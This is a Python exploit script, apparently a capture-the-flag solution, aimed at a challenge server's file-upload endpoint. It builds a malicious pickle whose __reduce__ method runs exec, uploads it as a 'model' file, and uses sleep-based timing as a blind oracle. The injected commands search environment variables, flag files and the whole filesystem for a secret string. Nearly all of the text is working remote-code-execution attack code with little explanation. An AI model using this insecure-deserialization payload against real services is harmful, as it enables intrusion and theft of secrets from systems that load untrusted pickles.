import pickle
import requests
import time

URL = "http://instance.ctf.it.kmitl.ac.th:5058/submit"

class Exploit:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (exec, (self.cmd,))

def test_condition(cmd):
    with open("model.pkl", "wb") as f:
        pickle.dump(Exploit(cmd), f)
    
    start = time.time()
    try:
        requests.post(URL, files={'model': open('model.pkl', 'rb')}, timeout=5)
    except requests.exceptions.ReadTimeout:
        pass
    return time.time() - start >= 1.2

print("Testing environment variables...")
cmd_env = """
import os, time
if 'Cl@sh' in str(os.environ):
    time.sleep(1.5)
"""
if test_condition(cmd_env):
    print("Flag is in Environment variables!")
else:
    print("Flag NOT in env.")

print("Testing popen('/flag.txt')...")
cmd_file1 = """
import os, time
if 'Cl@sh' in os.popen('cat /flag.txt 2>/dev/null').read():
    time.sleep(1.5)
"""
if test_condition(cmd_file1):
    print("Flag is in /flag.txt")

cmd_file2 = """
import os, time
res = os.popen('cat flag.txt 2>/dev/null').read()
if 'Cl@sh' in res:
    time.sleep(1.5)
"""
if test_condition(cmd_file2):
    print("Flag is in flag.txt")

cmd_find = """
import os, time
res = os.popen('grep -r "Cl@sh" /app 2>/dev/null').read()
if 'Cl@sh' in res:
    time.sleep(1.5)
"""
if test_condition(cmd_find):
    print("Flag is in /app")
    
cmd_find_root = """
import os, time
res = os.popen('grep -r "Cl@sh" / 2>/dev/null').read()
if 'Cl@sh' in res:
    time.sleep(1.5)
"""
print("Testing grep / ... (might take a while or timeout)")
# use carefully cause grep / might hang over 5s timeout and falsely trigger
